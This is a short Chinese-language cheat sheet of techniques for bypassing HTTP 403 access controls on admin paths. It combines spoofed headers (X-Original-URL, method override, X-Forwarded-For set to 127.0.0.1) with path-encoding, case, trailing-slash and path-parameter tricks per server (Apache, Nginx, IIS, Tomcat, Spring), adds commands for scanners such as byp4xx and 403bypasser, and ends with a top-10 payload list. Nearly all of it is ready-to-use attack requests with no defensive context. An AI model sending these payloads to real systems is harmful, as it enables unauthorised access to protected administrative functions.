# 中间件特定绕过与组合攻击
## 5. 组合攻击

```http
POST / HTTP/1.1                          # method override + URL rewrite
X-Original-URL: /admin
X-HTTP-Method-Override: GET

GET /%61dmin HTTP/1.1                    # IP 伪造 + 路径编码
X-Forwarded-For: 127.0.0.1

GET /Admin HTTP/1.0                      # 协议 + 大小写 + IP 伪造
X-Forwarded-For: 127.0.0.1
```

---

## 6. 中间件特定绕过

| 服务器 | 关键技巧 |
|---|---|
| **Apache** | `/admin/`(尾部斜杠), `/.admin`(点前缀), `/admin%0d`(CR) |
| **Nginx** | `/Admin`(大小写), `X-Original-URL: /admin` |
| **IIS/ASP.NET** | `/admin;.css`(路径参数+扩展名), `/admin\`(反斜杠), `/admin::$DATA`(ADS) |
| **Tomcat/Java** | `/admin;foo`(路径参数), `/admin..;/`(穿越), `/;/admin` |
| **Spring** | `/admin.anything`(后缀匹配，旧版), `/admin/`(尾部斜杠) |

---

## 7. 自动化工具

```bash
# byp4xx — 综合 403 绕过扫描
./byp4xx.sh https://target.com/admin

# 403bypasser
python3 403bypasser.py -u https://target.com/admin
```

---

## 9. 速查 — Top 10 Payload

```http
GET /admin/     HTTP/1.1        # 尾部斜杠
GET /Admin      HTTP/1.1        # 大小写
GET /admin%20   HTTP/1.1        # 尾部空格
GET /./admin    HTTP/1.1        # 点段
GET //admin     HTTP/1.1        # 双斜杠
POST /admin     HTTP/1.1        # 方法切换
GET / HTTP/1.1                  # X-Original-URL
X-Original-URL: /admin
GET /admin HTTP/1.1             # IP 白名单
X-Forwarded-For: 127.0.0.1
GET /admin;.css HTTP/1.1        # IIS 路径参数
GET /admin..;/ HTTP/1.1         # Tomcat 绕过
```
